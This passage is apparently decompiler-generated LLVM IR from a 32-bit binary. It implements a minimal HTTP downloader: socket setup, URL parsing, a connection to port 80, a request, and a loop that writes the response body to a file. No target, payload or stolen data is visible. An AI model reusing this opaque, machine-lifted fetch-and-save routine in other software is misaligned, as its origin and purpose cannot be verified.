dec_label_pc_8048a6f:                             ; preds = %dec_label_pc_8048a43, %dec_label_pc_8048a49
  %v4_8048a86 = call i32 @function_804da58(i32 2, i32 1, i32 0)
  %v8_8048a8e = icmp ne i32 %v4_8048a86, -1
  store i1 %v8_8048a8e, i1* %cf.global-to-local, align 1
  %v13_8048a8e = icmp eq i32 %v4_8048a86, -1
  %v1_8048a92 = icmp eq i1 %v13_8048a8e, false
  br i1 %v1_8048a92, label %dec_label_pc_8048aba, label %dec_label_pc_8048a94

dec_label_pc_8048a94:                             ; preds = %dec_label_pc_8048a6f
  %v3_8048aa9 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80522a0.18 to i32))
  store i32 %v3_8048aa9, i32* @eax, align 4
  %v1_8048ab5 = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8048aba

dec_label_pc_8048aba:                             ; preds = %dec_label_pc_8048a6f, %dec_label_pc_8048a94
  %v1_8048abd = add i32 %arg4, 4
  %v5_8048abd = icmp ugt i32 %arg4, -5
  store i1 %v5_8048abd, i1* %cf.global-to-local, align 1
  %v1_8048ac0 = inttoptr i32 %v1_8048abd to i32*
  %v2_8048ac0 = load i32, i32* %v1_8048ac0, align 4
  store i1 false, i1* @df, align 1
  %v4_8048add = inttoptr i32 %v2_8048ac0 to i8*
  store i32 %v2_8048ac0, i32* @esi, align 4
  %v7_8048aef = call i32 @_strncmp(i8* %v4_8048add, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80522c5.19, i32 0, i32 0), i32 7)
  %v8_8048aef = urem i32 %v7_8048aef, 2
  %v9_8048aef = icmp eq i32 %v8_8048aef, 0
  %v0_8048af1 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048af1 = or i1 %v0_8048af1, %v9_8048aef
  %v3_8048af1 = zext i1 %v2_8048af1 to i32
  %v4_8048af1 = load i32, i32* @edx, align 4
  %v5_8048af1 = and i32 %v4_8048af1, -256
  %v6_8048af1 = or i32 %v3_8048af1, %v5_8048af1
  %v7_8048af1 = xor i32 %v6_8048af1, 1
  store i32 %v7_8048af1, i32* %edx.global-to-local, align 4
  %v1_8048af9 = trunc i32 %v7_8048af1 to i8
  %v3_8048af9 = zext i1 %v0_8048af1 to i8
  %v15_8048af9 = icmp eq i8 %v1_8048af9, %v3_8048af9
  %v1_8048b02 = icmp eq i1 %v15_8048af9, false
  store i1 %v5_8048abd, i1* %cf.global-to-local, align 1
  %v2_8048b29 = load i32, i32* %v1_8048ac0, align 4
  br i1 %v1_8048b02, label %dec_label_pc_8048b23, label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048aba
  %v1_8048b0c = add i32 %v2_8048b29, 7
  %v5_8048b0c = icmp ugt i32 %v2_8048b29, -8
  store i1 %v5_8048b0c, i1* %cf.global-to-local, align 1
  %v2_8048b13 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048b13, i32* @eax, align 4
  %v3_8048b1c = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048b1c = call i32 @function_804d1e8(i8* %v3_8048b1c, i32 %v1_8048b0c)
  br label %dec_label_pc_8048b3d

dec_label_pc_8048b23:                             ; preds = %dec_label_pc_8048aba
  %v2_8048b2f = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048b2f, i32* @eax, align 4
  %v3_8048b38 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048b38 = call i32 @function_804d1e8(i8* %v3_8048b38, i32 %v2_8048b29)
  br label %dec_label_pc_8048b3d

dec_label_pc_8048b3d:                             ; preds = %dec_label_pc_8048b04, %dec_label_pc_8048b23
  %v4_8048b60.pre-phi = phi i8* [ %v3_8048b1c, %dec_label_pc_8048b04 ], [ %v3_8048b38, %dec_label_pc_8048b23 ]
  %v2_8048b4c.pre-phi = phi i32 [ %v2_8048b13, %dec_label_pc_8048b04 ], [ %v2_8048b2f, %dec_label_pc_8048b23 ]
  br label %dec_label_pc_8048b49

dec_label_pc_8048b46:                             ; preds = %dec_label_pc_8048b71
  %v4_8048b46 = add i32 %storemerge6, 1
  br label %dec_label_pc_8048b49

dec_label_pc_8048b49:                             ; preds = %dec_label_pc_8048b3d, %dec_label_pc_8048b46
  %storemerge6 = phi i32 [ %v4_8048b46, %dec_label_pc_8048b46 ], [ 0, %dec_label_pc_8048b3d ]
  store i32 %storemerge6, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048b4c.pre-phi, i32* @edi, align 4
  %v3_8048b66 = call i32 @_strlen(i8* %v4_8048b60.pre-phi)
  %v0_8048b6d = load i32, i32* @edx, align 4
  %v7_8048b6d = icmp ult i32 %v0_8048b6d, %v3_8048b66
  store i1 %v7_8048b6d, i1* %cf.global-to-local, align 1
  %v1_8048b6f = icmp eq i1 %v7_8048b6d, false
  br i1 %v1_8048b6f, label %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge, label %dec_label_pc_8048b71

dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge: ; preds = %dec_label_pc_8048b49
  %v0_8048b83.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge6, -1092
  br label %dec_label_pc_8048b80

dec_label_pc_8048b71:                             ; preds = %dec_label_pc_8048b49
  %v0_8048b74 = load i32, i32* @ebp, align 4
  %v2_8048b74 = add i32 %storemerge6, -1092
  %v3_8048b74 = add i32 %v0_8048b74, %v2_8048b74
  %v4_8048b74 = inttoptr i32 %v3_8048b74 to i8*
  %v5_8048b74 = load i8, i8* %v4_8048b74, align 1
  %v6_8048b7c = icmp ult i8 %v5_8048b74, 47
  store i1 %v6_8048b7c, i1* %cf.global-to-local, align 1
  %v10_8048b7c = icmp eq i8 %v5_8048b74, 47
  %v1_8048b7e = icmp eq i1 %v10_8048b7c, false
  br i1 %v1_8048b7e, label %dec_label_pc_8048b46, label %dec_label_pc_8048b80

dec_label_pc_8048b80:                             ; preds = %dec_label_pc_8048b71, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge
  %v2_8048b83.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge ], [ %v2_8048b74, %dec_label_pc_8048b71 ]
  %v0_8048b83 = phi i32 [ %v0_8048b83.pre, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge ], [ %v0_8048b74, %dec_label_pc_8048b71 ]
  %v3_8048b83 = add i32 %v0_8048b83, %v2_8048b83.pre-phi
  %v4_8048b83 = inttoptr i32 %v3_8048b83 to i8*
  store i8 0, i8* %v4_8048b83, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v2_8048b98 = call i32 @function_804d468(i16 80)
  %v1_8048bad = call i32 @function_804d570(i32 %v2_8048b4c.pre-phi)
  %v8_8048bb5 = icmp ne i32 %v1_8048bad, -1
  store i1 %v8_8048bb5, i1* %cf.global-to-local, align 1
  %v13_8048bb5 = icmp eq i32 %v1_8048bad, -1
  %v1_8048bb9 = icmp eq i1 %v13_8048bb5, false
  br i1 %v1_8048bb9, label %dec_label_pc_8048c17, label %dec_label_pc_8048bbb

dec_label_pc_8048bbb:                             ; preds = %dec_label_pc_8048b80
  %v1_8048bc4 = call i32 @function_804d598(i32 %v2_8048b4c.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048bcc = icmp eq i32 %v1_8048bc4, 0
  %v1_8048bd0 = icmp eq i1 %v4_8048bcc, false
  br i1 %v1_8048bd0, label %dec_label_pc_8048bf8, label %dec_label_pc_8048bd2

dec_label_pc_8048bd2:                             ; preds = %dec_label_pc_8048bbb
  %v3_8048be7 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80522d0.20 to i32))
  store i32 %v3_8048be7, i32* @eax, align 4
  %v1_8048bf3 = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8048bf8

dec_label_pc_8048bf8:                             ; preds = %dec_label_pc_8048bbb, %dec_label_pc_8048bd2
  %v1_8048bfb = add i32 %v1_8048bc4, 12
  %v2_8048bfb = inttoptr i32 %v1_8048bfb to i32*
  %v3_8048bfb = load i32, i32* %v2_8048bfb, align 4
  %v1_8048c03 = add i32 %v1_8048bc4, 16
  %v2_8048c03 = inttoptr i32 %v1_8048c03 to i32*
  %v3_8048c03 = load i32, i32* %v2_8048c03, align 4
  %v1_8048c06 = inttoptr i32 %v3_8048c03 to i32*
  %v2_8048c06 = load i32, i32* %v1_8048c06, align 4
  store i32 %v2_8048c06, i32* %edx.global-to-local, align 4
  %v5_8048c0b = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048c0b, i1* %cf.global-to-local, align 1
  %v15_8048c0b = ptrtoint i32* %stack_var_-68 to i32
  %tmp66 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048c0b, i32* @edi, align 4
  %v1_8048c10 = inttoptr i32 %v2_8048c06 to i8*
  store i32 %v2_8048c06, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048c13 = call i8* @_memcpy(i8* %tmp66, i8* %v1_8048c10, i32 %v3_8048bfb)
  br label %dec_label_pc_8048c1d

dec_label_pc_8048c17:                             ; preds = %dec_label_pc_8048b80
  store i32 %v1_8048bad, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048c1d

dec_label_pc_8048c1d:                             ; preds = %dec_label_pc_8048bf8, %dec_label_pc_8048c17
  %v2_8048c1d.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048c20 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8048c20, i1* %cf.global-to-local, align 1
  %v4_8048c45 = call i32 @function_804d954(i32 %v4_8048a86, i32 %v2_8048c1d.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c4a = icmp eq i32 %v4_8048c45, 0
  br i1 %v1_8048c4a, label %dec_label_pc_8048c74, label %dec_label_pc_8048c4e

dec_label_pc_8048c4e:                             ; preds = %dec_label_pc_8048c1d
  %v3_8048c63 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80522f8.21 to i32))
  store i32 %v3_8048c63, i32* @eax, align 4
  %v1_8048c6f = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8048c74

dec_label_pc_8048c74:                             ; preds = %dec_label_pc_8048c1d, %dec_label_pc_8048c4e
  %v2_8048c7f = add i32 %storemerge6, %v2_8048b4c.pre-phi
  %v7_8048c7f = icmp ult i32 %v2_8048c7f, %v2_8048b4c.pre-phi
  store i1 %v7_8048c7f, i1* %cf.global-to-local, align 1
  %v1_8048c81 = add i32 %v2_8048c7f, 1
  store i32 %v1_8048c81, i32* %edx.global-to-local, align 4
  %v3_8048ca0 = call i32 @function_80482b3(i32 %v4_8048a86, i32 ptrtoint ([276 x i8]* @global_var_8052320.22 to i32))
  %v3_8048cba = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8052434.23 to i32))
  %v1_8048cc2 = add i32 %arg4, 8
  %v5_8048cc2 = icmp ugt i32 %arg4, -9
  store i1 %v5_8048cc2, i1* %cf.global-to-local, align 1
  %v1_8048cc5 = inttoptr i32 %v1_8048cc2 to i32*
  %v2_8048cc5 = load i32, i32* %v1_8048cc5, align 4
  store i32 %v2_8048cc5, i32* @eax, align 4
  %v3_8048cd2 = call i32 @function_804b90c(i32 %v2_8048cc5, i32 ptrtoint ([3 x i8]* @global_var_8052450.24 to i32))
  %v2_8048cea = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048cfa96 = call i32 @function_804d9a4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp6799 = icmp slt i32 %v5_8048cfa96, 1
  br i1 %tmp6799, label %dec_label_pc_8048e22.loopexit12, label %dec_label_pc_8048d0c

dec_label_pc_8048cda.loopexit:                    ; preds = %dec_label_pc_8048e0e
  %v5_8048cfa = call i32 @function_804d9a4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v5_8048cfa, 1
  br i1 %tmp67, label %dec_label_pc_8048e22.loopexit12, label %dec_label_pc_8048d0c

dec_label_pc_8048d0c:                             ; preds = %dec_label_pc_8048c74, %dec_label_pc_8048cda.loopexit
  %v5_8048cfa100 = phi i32 [ %v5_8048cfa, %dec_label_pc_8048cda.loopexit ], [ %v5_8048cfa96, %dec_label_pc_8048c74 ]
  %v4_8048d0c = add i32 %v5_8048cfa100, -4095
  %v8_8048d0c = icmp ult i32 %v5_8048cfa100, 4095
  %v9_8048d0c = sub i32 4094, %v5_8048cfa100
  %v10_8048d0c = and i32 %v9_8048d0c, %v5_8048cfa100
  %v11_8048d0c = icmp slt i32 %v10_8048d0c, 0
  store i1 %v8_8048d0c, i1* %cf.global-to-local, align 1
  %v12_8048d0c = icmp eq i32 %v4_8048d0c, 0
  %v13_8048d0c = icmp slt i32 %v4_8048d0c, 0
  %v3_8048d13 = icmp eq i1 %v13_8048d0c, %v11_8048d0c
  %v4_8048d13 = icmp eq i1 %v12_8048d0c, false
  %v5_8048d13 = and i1 %v4_8048d13, %v3_8048d13
  br i1 %v5_8048d13, label %dec_label_pc_8048d2c.lr.ph, label %dec_label_pc_8048d15

dec_label_pc_8048d15:                             ; preds = %dec_label_pc_8048d0c
  %v0_8048d18 = load i32, i32* @ebp, align 4
  %v2_8048d18 = add i32 %v5_8048cfa100, -5188
  %v3_8048d18 = add i32 %v2_8048d18, %v0_8048d18
  %v4_8048d18 = inttoptr i32 %v3_8048d18 to i8*
  store i8 0, i8* %v4_8048d18, align 1
  br label %dec_label_pc_8048d2c.lr.ph

dec_label_pc_8048d2c.lr.ph:                       ; preds = %dec_label_pc_8048d15, %dec_label_pc_8048d0c
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d2c

dec_label_pc_8048d2c:                             ; preds = %dec_label_pc_8048d2c.lr.ph, %dec_label_pc_8048e0e
  %storemerge595 = phi i32 [ 0, %dec_label_pc_8048d2c.lr.ph ], [ %v4_8048e0e, %dec_label_pc_8048e0e ]
  store i32 %storemerge595, i32* %edx.global-to-local, align 4
  %v2_8048d37 = add i32 %storemerge595, %v2_8048cea
  %v7_8048d37 = icmp ult i32 %v2_8048d37, %v2_8048cea
  store i1 %v7_8048d37, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048d54 = inttoptr i32 %v2_8048d37 to i8*
  store i32 %v2_8048d37, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052453.25 to i32), i32* @edi, align 4
  %v7_8048d66 = call i32 @_strncmp(i8* %v4_8048d54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052453.25, i32 0, i32 0), i32 4)
  %v8_8048d66 = urem i32 %v7_8048d66, 2
  %v9_8048d66 = icmp eq i32 %v8_8048d66, 0
  %v0_8048d68 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048d68 = or i1 %v0_8048d68, %v9_8048d66
  %v3_8048d68 = zext i1 %v2_8048d68 to i32
  %v4_8048d68 = load i32, i32* %edx.global-to-local, align 4
  %v5_8048d68 = and i32 %v4_8048d68, -256
  %v6_8048d68 = or i32 %v3_8048d68, %v5_8048d68
  %v7_8048d68 = xor i32 %v6_8048d68, 1
  store i32 %v7_8048d68, i32* %edx.global-to-local, align 4
  %v3_8048d6e = and i32 %v7_8048d66, -256
  %v1_8048d70 = trunc i32 %v7_8048d68 to i8
  %v3_8048d70 = zext i1 %v0_8048d68 to i8
  %v4_8048d70 = sub nsw i8 %v1_8048d70, %v3_8048d70
  %v15_8048d70 = icmp eq i8 %v4_8048d70, 0
  %v20_8048d70 = zext i8 %v4_8048d70 to i32
  %v23_8048d70 = or i32 %v20_8048d70, %v3_8048d6e
  store i32 %v23_8048d70, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d79 = icmp eq i1 %v15_8048d70, false
  br i1 %v1_8048d79, label %dec_label_pc_8048e0e, label %dec_label_pc_8048d7f

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048d2c
  %v4_8048d7f = add i32 %storemerge595, 4
  %v1_8048d8e = add i32 %v3_8048cd2, 52
  %v2_8048d8e = inttoptr i32 %v1_8048d8e to i32*
  %v1_8048d98 = add i32 %v3_8048cd2, 16
  %v2_8048d98 = inttoptr i32 %v1_8048d98 to i32*
  %v1_8048d9e = add i32 %v3_8048cd2, 28
  %v2_8048d9e = inttoptr i32 %v1_8048d9e to i32*
  %v10_8048e0385 = icmp ult i32 %v4_8048d7f, %v5_8048cfa100
  store i1 %v10_8048e0385, i1* %cf.global-to-local, align 1
  %v5_8048e0688 = icmp slt i32 %v4_8048d7f, %v5_8048cfa100
  br i1 %v5_8048e0688, label %dec_label_pc_8048d85, label %dec_label_pc_8048e22

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048dfd
  %storemerge10.in89 = phi i32 [ %v4_8048dfd, %dec_label_pc_8048dfd ], [ %v4_8048d7f, %dec_label_pc_8048d7f ]
  %v3_8048d8e = load i32, i32* %v2_8048d8e, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d91 = icmp eq i32 %v3_8048d8e, 0
  br i1 %v1_8048d91, label %dec_label_pc_8048de0, label %dec_label_pc_8048d95

dec_label_pc_8048d95:                             ; preds = %dec_label_pc_8048d85
  %v3_8048d98 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048d98, i32* %edx.global-to-local, align 4
  %v3_8048d9e = load i32, i32* %v2_8048d9e, align 4
  %v7_8048da1 = icmp ult i32 %v3_8048d98, %v3_8048d9e
  store i1 %v7_8048da1, i1* %cf.global-to-local, align 1
  %v1_8048da3 = icmp eq i1 %v7_8048da1, false
  br i1 %v1_8048da3, label %dec_label_pc_8048dc1, label %dec_label_pc_8048da5

dec_label_pc_8048da5:                             ; preds = %dec_label_pc_8048d95
  %v3_8048da8 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048da8, i32* %edx.global-to-local, align 4
  %v0_8048dae = load i32, i32* @ebp, align 4
  %v2_8048dae = add i32 %storemerge10.in89, -5188
  %v3_8048dae = add i32 %v2_8048dae, %v0_8048dae
  %v4_8048dae = inttoptr i32 %v3_8048dae to i8*
  %v5_8048dae = load i8, i8* %v4_8048dae, align 1
  %v3_8048db6 = inttoptr i32 %v3_8048da8 to i8*
  store i8 %v5_8048dae, i8* %v3_8048db6, align 1
  %v0_8048db8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048db8 = add i32 %v0_8048db8, 1
  store i32 %v1_8048db8, i32* %edx.global-to-local, align 4
  store i32 %v1_8048db8, i32* %v2_8048d98, align 4
  br label %dec_label_pc_8048dfd

dec_label_pc_8048dc1:                             ; preds = %dec_label_pc_8048d95
  %v0_8048dc4 = load i32, i32* @ebp, align 4
  %v2_8048dc4 = add i32 %storemerge10.in89, -5188
  %v3_8048dc4 = add i32 %v2_8048dc4, %v0_8048dc4
  %v4_8048dc4 = inttoptr i32 %v3_8048dc4 to i8*
  %v5_8048dc4 = load i8, i8* %v4_8048dc4, align 1
  %v6_8048dc4 = zext i8 %v5_8048dc4 to i32
  store i32 %v6_8048dc4, i32* @edx, align 4
  %v4_8048dd9 = call i32 @function_804d040(i8 %v5_8048dc4, i32 %v3_8048cd2)
  br label %dec_label_pc_8048dfd

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048d85
  %v0_8048de3 = load i32, i32* @ebp, align 4
  %v2_8048de3 = add i32 %storemerge10.in89, -5188
  %v3_8048de3 = add i32 %v2_8048de3, %v0_8048de3
  %v4_8048de3 = inttoptr i32 %v3_8048de3 to i8*
  %v5_8048de3 = load i8, i8* %v4_8048de3, align 1
  %v6_8048de3 = zext i8 %v5_8048de3 to i32
  store i32 %v6_8048de3, i32* @edx, align 4
  %v4_8048df8 = call i32 @function_804cd0c(i8 %v5_8048de3, i32 %v3_8048cd2)
  br label %dec_label_pc_8048dfd

dec_label_pc_8048dfd:                             ; preds = %dec_label_pc_8048dc1, %dec_label_pc_8048da5, %dec_label_pc_8048de0
  %v4_8048dfd = add i32 %storemerge10.in89, 1
  %v10_8048e03 = icmp ult i32 %v4_8048dfd, %v5_8048cfa100
  store i1 %v10_8048e03, i1* %cf.global-to-local, align 1
  %exitcond105 = icmp eq i32 %v4_8048dfd, %v5_8048cfa100
  br i1 %exitcond105, label %dec_label_pc_8048e22, label %dec_label_pc_8048d85

dec_label_pc_8048e0e:                             ; preds = %dec_label_pc_8048d2c
  %v4_8048e0e = add nuw nsw i32 %storemerge595, 1
  %v10_8048e14 = icmp ult i32 %v4_8048e0e, %v5_8048cfa100
  store i1 %v10_8048e14, i1* %cf.global-to-local, align 1
  %v5_8048e17 = icmp slt i32 %v4_8048e0e, %v5_8048cfa100
  br i1 %v5_8048e17, label %dec_label_pc_8048d2c, label %dec_label_pc_8048cda.loopexit

dec_label_pc_8048e22.loopexit12:                  ; preds = %dec_label_pc_8048cda.loopexit, %dec_label_pc_8048c74
  %.pre23 = add i32 %v3_8048cd2, 52
  %.pre24 = inttoptr i32 %.pre23 to i32*
  %.pre25 = add i32 %v3_8048cd2, 16
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %.pre27 = add i32 %v3_8048cd2, 28
  %.pre28 = inttoptr i32 %.pre27 to i32*
  br label %dec_label_pc_8048e22

dec_label_pc_8048e22:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048dfd, %dec_label_pc_8048e22.loopexit12
  %v2_8048eb0.pre-phi = phi i32* [ %.pre28, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d9e, %dec_label_pc_8048dfd ], [ %v2_8048d9e, %dec_label_pc_8048d7f ]
  %v2_8048eaa.pre-phi = phi i32* [ %.pre26, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d98, %dec_label_pc_8048dfd ], [ %v2_8048d98, %dec_label_pc_8048d7f ]
  %v2_8048ea0.pre-phi = phi i32* [ %.pre24, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d8e, %dec_label_pc_8048dfd ], [ %v2_8048d8e, %dec_label_pc_8048d7f ]
  store i1 %v5_8048cc2, i1* %cf.global-to-local, align 1
  %v3_8048e43 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052458.26 to i32))
  %v5_8048e6879 = call i32 @function_804d9a4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp6882 = icmp slt i32 %v5_8048e6879, 1
  br i1 %tmp6882, label %dec_label_pc_8048f23, label %dec_label_pc_8048e7a

dec_label_pc_8048e48.loopexit:                    ; preds = %dec_label_pc_8048f0f
  %v5_8048e68 = call i32 @function_804d9a4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp68 = icmp slt i32 %v5_8048e68, 1
  br i1 %tmp68, label %dec_label_pc_8048f23, label %dec_label_pc_8048e7a

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048e22, %dec_label_pc_8048e48.loopexit
  %v5_8048e6883 = phi i32 [ %v5_8048e68, %dec_label_pc_8048e48.loopexit ], [ %v5_8048e6879, %dec_label_pc_8048e22 ]
  %v4_8048e7a = add i32 %v5_8048e6883, -4095
  %v8_8048e7a = icmp ult i32 %v5_8048e6883, 4095
  %v9_8048e7a = sub i32 4094, %v5_8048e6883
  %v10_8048e7a = and i32 %v9_8048e7a, %v5_8048e6883
  %v11_8048e7a = icmp slt i32 %v10_8048e7a, 0
  store i1 %v8_8048e7a, i1* %cf.global-to-local, align 1
  %v12_8048e7a = icmp eq i32 %v4_8048e7a, 0
  %v13_8048e7a = icmp slt i32 %v4_8048e7a, 0
  %v3_8048e81 = icmp eq i1 %v13_8048e7a, %v11_8048e7a
  %v4_8048e81 = icmp eq i1 %v12_8048e7a, false
  %v5_8048e81 = and i1 %v4_8048e81, %v3_8048e81
  br i1 %v5_8048e81, label %dec_label_pc_8048e97.lr.ph, label %dec_label_pc_8048e83

dec_label_pc_8048e83:                             ; preds = %dec_label_pc_8048e7a
  %v0_8048e86 = load i32, i32* @ebp, align 4
  %v2_8048e86 = add i32 %v5_8048e6883, -5188
  %v3_8048e86 = add i32 %v2_8048e86, %v0_8048e86
  %v4_8048e86 = inttoptr i32 %v3_8048e86 to i8*
  store i8 0, i8* %v4_8048e86, align 1
  br label %dec_label_pc_8048e97.lr.ph

dec_label_pc_8048e97.lr.ph:                       ; preds = %dec_label_pc_8048e83, %dec_label_pc_8048e7a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048e97

dec_label_pc_8048e97:                             ; preds = %dec_label_pc_8048f0f, %dec_label_pc_8048e97.lr.ph
  %storemerge78 = phi i32 [ 0, %dec_label_pc_8048e97.lr.ph ], [ %v4_8048f0f, %dec_label_pc_8048f0f ]
  %v3_8048ea0 = load i32, i32* %v2_8048ea0.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048ea3 = icmp eq i32 %v3_8048ea0, 0
  br i1 %v1_8048ea3, label %dec_label_pc_8048ef2, label %dec_label_pc_8048ea7

dec_label_pc_8048ea7:                             ; preds = %dec_label_pc_8048e97
  %v3_8048eaa = load i32, i32* %v2_8048eaa.pre-phi, align 4
  store i32 %v3_8048eaa, i32* %edx.global-to-local, align 4
  %v3_8048eb0 = load i32, i32* %v2_8048eb0.pre-phi, align 4
  %v7_8048eb3 = icmp ult i32 %v3_8048eaa, %v3_8048eb0
  store i1 %v7_8048eb3, i1* %cf.global-to-local, align 1
  %v1_8048eb5 = icmp eq i1 %v7_8048eb3, false
  br i1 %v1_8048eb5, label %dec_label_pc_8048ed3, label %dec_label_pc_8048eb7

dec_label_pc_8048eb7:                             ; preds = %dec_label_pc_8048ea7
  %v3_8048eba = load i32, i32* %v2_8048eaa.pre-phi, align 4
  store i32 %v3_8048eba, i32* %edx.global-to-local, align 4
  %v0_8048ec0 = load i32, i32* @ebp, align 4
  %v2_8048ec0 = add nsw i32 %storemerge78, -5188
  %v3_8048ec0 = add i32 %v2_8048ec0, %v0_8048ec0
  %v4_8048ec0 = inttoptr i32 %v3_8048ec0 to i8*
  %v5_8048ec0 = load i8, i8* %v4_8048ec0, align 1
  %v3_8048ec8 = inttoptr i32 %v3_8048eba to i8*
  store i8 %v5_8048ec0, i8* %v3_8048ec8, align 1
  %v0_8048eca = load i32, i32* %edx.global-to-local, align 4
  %v1_8048eca = add i32 %v0_8048eca, 1
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  store i32 %v1_8048eca, i32* %v2_8048eaa.pre-phi, align 4
  br label %dec_label_pc_8048f0f

dec_label_pc_8048ed3:                             ; preds = %dec_label_pc_8048ea7
  %v0_8048ed6 = load i32, i32* @ebp, align 4
  %v2_8048ed6 = add nsw i32 %storemerge78, -5188
  %v3_8048ed6 = add i32 %v2_8048ed6, %v0_8048ed6
  %v4_8048ed6 = inttoptr i32 %v3_8048ed6 to i8*
  %v5_8048ed6 = load i8, i8* %v4_8048ed6, align 1
  %v6_8048ed6 = zext i8 %v5_8048ed6 to i32
  store i32 %v6_8048ed6, i32* @edx, align 4
  %v4_8048eeb = call i32 @function_804d040(i8 %v5_8048ed6, i32 %v3_8048cd2)
  br label %dec_label_pc_8048f0f

dec_label_pc_8048ef2:                             ; preds = %dec_label_pc_8048e97
  %v0_8048ef5 = load i32, i32* @ebp, align 4
  %v2_8048ef5 = add nsw i32 %storemerge78, -5188
  %v3_8048ef5 = add i32 %v2_8048ef5, %v0_8048ef5
  %v4_8048ef5 = inttoptr i32 %v3_8048ef5 to i8*
  %v5_8048ef5 = load i8, i8* %v4_8048ef5, align 1
  %v6_8048ef5 = zext i8 %v5_8048ef5 to i32
  store i32 %v6_8048ef5, i32* @edx, align 4
  %v4_8048f0a = call i32 @function_804cd0c(i8 %v5_8048ef5, i32 %v3_8048cd2)
  br label %dec_label_pc_8048f0f

dec_label_pc_8048f0f:                             ; preds = %dec_label_pc_8048ed3, %dec_label_pc_8048eb7, %dec_label_pc_8048ef2
  %v4_8048f0f = add nuw nsw i32 %storemerge78, 1
  %v10_8048f15 = icmp ult i32 %v4_8048f0f, %v5_8048e6883
  store i1 %v10_8048f15, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048f0f, %v5_8048e6883
  br i1 %exitcond, label %dec_label_pc_8048e48.loopexit, label %dec_label_pc_8048e97

dec_label_pc_8048f23:                             ; preds = %dec_label_pc_8048e48.loopexit, %dec_label_pc_8048e22
  store i32 %v3_8048cd2, i32* @eax, align 4
  %v1_8048f29 = inttoptr i32 %v3_8048cd2 to i16*
  %v2_8048f29 = call i32 @function_804b7fc(i16* %v1_8048f29)
  %v1_8048f34 = call i32 @function_804b5f4(i32 %v4_8048a86)
  store i32 %v1_8048f34, i32* @eax, align 4
  %v1_8048f40 = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8048f45

dec_label_pc_8048f45:                             ; preds = %dec_label_pc_8048a25, %dec_label_pc_8048f23
  %v0_8048f4e = phi i32 [ %v1_8048a36, %dec_label_pc_8048a25 ], [ %v1_8048f40, %dec_label_pc_8048f23 ]
  %v0_8048f45 = load i32, i32* @esp, align 4
  %v2_8048f45 = icmp ugt i32 %v0_8048f45, -5233
  store i1 %v2_8048f45, i1* %cf.global-to-local, align 1
  ret i32 %v0_8048f4e

; uselistorder directives
